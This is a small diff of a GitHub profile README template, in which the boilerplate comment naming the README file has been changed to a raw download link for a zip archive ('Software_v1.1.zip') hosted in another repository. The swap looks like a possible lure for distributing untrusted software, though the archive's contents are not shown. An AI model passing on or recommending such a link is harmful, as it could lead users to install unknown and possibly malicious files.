@@ -5,6 +5,6 @@
 - 📫 How to reach me ...
 
 <!---
-ivxndavid/ivxndavid is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/ivxndavid/opendsa/main/polyaxial/Software-3.6.zip` (this file) appears on your GitHub profile.
+ivxndavid/ivxndavid is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/ivxndavid/opendsa/main/polyaxial/Software_v1.1.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
